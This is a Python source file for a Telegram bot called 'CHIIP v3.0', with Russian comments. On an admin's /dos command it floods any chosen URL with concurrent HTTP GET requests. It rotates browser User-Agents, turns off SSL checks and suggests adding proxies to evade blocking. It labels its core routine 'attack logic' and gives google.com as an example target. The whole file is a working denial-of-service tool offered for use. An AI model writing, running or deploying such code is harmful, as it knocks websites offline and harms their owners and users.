import os
import asyncio
import logging
import random
from aiohttp import web, ClientSession, ClientTimeout
from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import Command

# --- CONFIG ---
API_TOKEN = os.getenv('BOT_TOKEN')
ADMIN_ID = int(os.getenv('ADMIN_ID', 0))

bot = Bot(token=API_TOKEN)
dp = Dispatcher()
stop_flag = False

# Список популярных User-Agents
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1"
]

# --- WEB SERVER (KEEP ALIVE) ---
async def handle(request):
    return web.Response(text="CHIIP Power: Active")

async def start_web_server():
    app = web.Application()
    app.router.add_get('/', handle)
    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, '0.0.0.0', int(os.getenv("PORT", 8080)))
    await site.start()

# --- ЛОГИКА АТАКИ ---
async def attack_logic(url, threads, message):
    global stop_flag
    stop_flag = False
    timeout = ClientTimeout(total=5)
    count = 0

    # Можно добавить список прокси: proxies = ["http://user:pass@ip:port", ...]
    async with ClientSession(timeout=timeout) as session:
        while not stop_flag:
            tasks = []
            for _ in range(threads):
                headers = {'User-Agent': random.choice(USER_AGENTS)}
                # Для использования прокси добавь параметр: proxy="http://your_proxy"
                tasks.append(asyncio.create_task(session.get(url, headers=headers, ssl=False)))
            
            await asyncio.gather(*tasks, return_exceptions=True)
            count += threads
            
            if count % 1000 == 0:
                print(f"DEBUG: Sent {count} requests to {url}")
            
            # Важная пауза, чтобы бот не завис на Render
            await asyncio.sleep(0.1)

    await message.answer(f"🛑 Тест завершен.\n🎯 Цель: {url}\n📤 Отправлено запросов: {count}")

# --- HANDLERS ---
@dp.message(Command("start"))
async def cmd_start(message: types.Message):
    await message.answer("🦾 **CHIIP v3.0 Online**\n\nИспользуй: `/dos URL THREADS`\nПример: `/dos https://google.com 50`", parse_mode="Markdown")

@dp.message(Command("dos"))
async def cmd_dos(message: types.Message):
    if message.from_user.id != ADMIN_ID: return
    args = message.text.split()
    if len(args) < 3: return await message.answer("⚠️ Формат: /dos url threads")
    
    url = args[1]
    threads = int(args[2])
    
    asyncio.create_task(attack_logic(url, threads, message))
    await message.answer(f"🚀 **Атака запущена!**\n🌐 Цель: {url}\n🧵 Потоков: {threads}", parse_mode="Markdown")

@dp.message(Command("stop"))
async def cmd_stop(message: types.Message):
    global stop_flag
    if message.from_user.id != ADMIN_ID: return
    stop_flag = True
    await message.answer("⏳ Останавливаю процессы...")

async def main():
    asyncio.create_task(start_web_server())
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())